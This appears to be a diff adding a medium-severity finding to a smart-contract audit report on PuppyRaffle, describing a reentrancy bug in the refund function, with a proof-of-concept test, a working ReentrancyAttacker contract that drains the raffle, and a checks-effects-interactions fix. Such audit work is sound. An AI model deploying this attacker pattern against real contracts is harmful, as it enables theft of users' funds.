@@ -71,3 +71,98 @@ function enterRaffle(address[] memory newPlayers) public payable {
 ```
 
 2. Allow duplicates to enter the raffle, as if any user wants to enter more than once he could just use different metamask accounts and enter from them.
+
+
+
+
+
+
+### [M-#] There is a possible Reentrancy attack happening in `PuppyRaffle::refund`.
+
+**Description:** In the function `PuppyRaffle::refund`, you are sending the refund to the user and after sending updating the state of the mapping which is the reason why  reentract attack can happen very easily. Remember the rule to first update the state and then execute the code or just follow CEI rule i.e. checks, effects, implementation.
+
+**Impact:** This seems to be a very tiny bug from naked eye, but in reality an attacker can very easily wipe out all the Eth from the contract with so ease and with in seconds. In you contract when user calls the function `PuppyRaffle::refund`, first it verifies the written checks and it they gets approved the the refund is sent to the user, so when `payable(msg.sender).sendValue(entranceFee);` this line gets triggered and suppose the cantract is calling this function so this line just looks for receive or fallback function in contract and suppose if the receive or fallback says to just run the `PuppyRaffle::refund` then it just gets stuck in a loop that ends when the amount of the contract gets empty because we updated the state after sending eth.
+
+**Proof of Concept:** The above test proves that there is a possibility of an Reentrancy attack: 
+
+```javascript
+
+function testReentrancyAttackCanHappen() external{
+
+    address[] memory players = new address[](3);
+    players[0] = address(111);
+    players[1] = address(100);
+    players[2] = address(200);
+    puppyRaffle.enterRaffle{value: entranceFee * 3}(players);
+
+    uint256 startingContractBalance = address(puppyRaffle).balance;
+    ReentrancyAttacker ree = new ReentrancyAttacker(puppyRaffle);
+    uint256 startingAttackerContractBalance = address(ree).balance;
+    ree.attack{value: entranceFee}();
+
+    uint256 endingContractBalance = address(puppyRaffle).balance;
+    uint256 endingAttackerContractBalance = address(ree).balance;
+
+    console.log("the starting balance of attacker contract is: ", startingAttackerContractBalance);
+    console.log("the starting balance of contract is: ", startingContractBalance);
+    console.log("the endinging balance of attacker contract is: ", endingAttackerContractBalance);
+    console.log("the endinging balance of contract is: ", endingContractBalance);
+    }
+
+
+contract ReentrancyAttacker {
+
+    PuppyRaffle puppy;
+    uint256 fees;
+    uint256 playerIndex;
+
+    constructor(PuppyRaffle _puppy){
+        puppy = _puppy;
+
+    }
+
+    function attack() external payable{
+        address[] memory players = new address[](1);
+        players[0] = address(this);
+        fees = puppy.entranceFee();
+        puppy.enterRaffle{value: fees}(players);
+        playerIndex = puppy.getActivePlayerIndex(address(this));
+        puppy.refund(playerIndex);
+    }
+
+    fallback() external payable{
+        if(address(puppy).balance >= fees){
+            puppy.refund(playerIndex);
+        }
+    }
+
+    receive() external payable{
+        if(address(puppy).balance >= fees){
+            puppy.refund(playerIndex);
+        }
+    }
+}
+
+```
+
+
+**Recommended Mitigation:** My recommendation to secure your contract from Reentrancy attack is always follow CEI (checks,effects,interactions) in your function which is sending eth. 
+The change you should do in your function `PuppyRaffle::refund` is just use this line `players[playerIndex] = address(0);` before this `payable(msg.sender).sendValue(entranceFee);`. This way you can prevent your contract from Reentrancy attack.
+
+```diff
+
+function refund(uint256 playerIndex) public {
+        address playerAddress = players[playerIndex];
+        require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
+        require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");
+
+        // @audit Reentrancy attack here
++       players[playerIndex] = address(0);
+        payable(msg.sender).sendValue(entranceFee);
+
+-       players[playerIndex] = address(0);
+        emit RaffleRefunded(playerAddress);
+    }
+
+
+```
